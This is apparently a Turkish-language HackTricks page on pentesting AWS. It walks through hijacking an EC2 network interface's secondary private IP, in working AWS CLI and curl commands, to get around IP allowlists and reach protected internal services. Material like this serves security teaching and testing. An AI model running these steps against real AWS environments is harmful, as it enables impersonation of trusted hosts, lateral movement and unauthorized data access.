# AWS – EC2 ENI Secondary Private IP Hijack (Trust/Allowlist Bypass)

{{#include ../../../../banners/hacktricks-training.md}}

`ec2:UnassignPrivateIpAddresses` ve `ec2:AssignPrivateIpAddresses` izinlerini kötüye kullanarak hedef ENI’nin ikincil özel IP’sini çalın ve aynı subnet/AZ içindeki saldırgan ENI’ye taşıyın. Birçok iç hizmet ve security groups erişimi belirli özel IP’lerle kısıtlar. Bu ikincil adresi taşıyarak saldırgan L3 düzeyinde güvenilen ana makineyi taklit eder ve izin verilmiş hizmetlere erişebilir.

Önkoşullar:
- İzinler: `ec2:DescribeNetworkInterfaces`, `ec2:UnassignPrivateIpAddresses` hedef ENI ARN üzerinde, ve `ec2:AssignPrivateIpAddresses` saldırgan ENI ARN üzerinde.
- Her iki ENI de aynı subnet/AZ içinde olmalıdır. Hedef adres bir ikincil IP olmalıdır (primary IP kaldırılamaz).

Değişkenler:
- REGION=us-east-1
- VICTIM_ENI=<eni-xxxxxxxx>
- ATTACKER_ENI=<eni-yyyyyyyy>
- PROTECTED_SG=<sg-protected>   # SG on a target service that allows only $HIJACK_IP
- PROTECTED_HOST=<private-dns-or-ip-of-protected-service>

Adımlar:
1) Hedef ENI'den bir ikincil IP seçin
```bash
aws ec2 describe-network-interfaces --network-interface-ids $VICTIM_ENI --region $REGION   --query NetworkInterfaces[0].PrivateIpAddresses[?Primary==`false`].PrivateIpAddress --output text | head -n1 | tee HIJACK_IP
export HIJACK_IP=$(cat HIJACK_IP)
```
2) Korunan hostun yalnızca o IP'ye izin verdiğinden emin olun (idempotent). Eğer SG-to-SG kuralları kullanılıyorsa, atlayın.
```bash
aws ec2 authorize-security-group-ingress --group-id $PROTECTED_SG --protocol tcp --port 80   --cidr "$HIJACK_IP/32" --region $REGION || true
```
3) Temel durum: attacker instance'tan PROTECTED_HOST'e yapılan istek, spoofed source olmadan başarısız olmalıdır (ör. SSM/SSH üzerinden).
```bash
curl -sS --max-time 3 http://$PROTECTED_HOST || true
```
4) Hedef ENI'den ikincil IP'yi ayırın
```bash
aws ec2 unassign-private-ip-addresses --network-interface-id $VICTIM_ENI   --private-ip-addresses $HIJACK_IP --region $REGION
```
5) attacker ENI'ye aynı IP adresini atayın (AWS CLI v1 için `--allow-reassignment` ekleyin`)
```bash
aws ec2 assign-private-ip-addresses --network-interface-id $ATTACKER_ENI   --private-ip-addresses $HIJACK_IP --region $REGION
```
6) Sahipliğin taşındığını doğrulayın
```bash
aws ec2 describe-network-interfaces --network-interface-ids $ATTACKER_ENI --region $REGION   --query NetworkInterfaces[0].PrivateIpAddresses[].PrivateIpAddress --output text | grep -w $HIJACK_IP
```
7) Saldırgan instance'tan, korunan hosta erişmek için hijacked IP'ye source-bind yapın (IP'nin işletim sistemine yapılandırıldığından emin olun; değilse `ip addr add $HIJACK_IP/<mask> dev eth0` ile ekleyin)
```bash
curl --interface $HIJACK_IP -sS http://$PROTECTED_HOST -o /tmp/poc.out && head -c 80 /tmp/poc.out
```
## Etki
- Aynı subnet/AZ içindeki ENIs arasında secondary private IPs taşıyarak IP allowlists'lerini atlatın ve VPC içindeki trusted hosts'u taklit edin.
- Belirli source IPs ile erişimi kısıtlayan internal services'e erişim sağlayarak lateral movement ve data access'e izin verir.
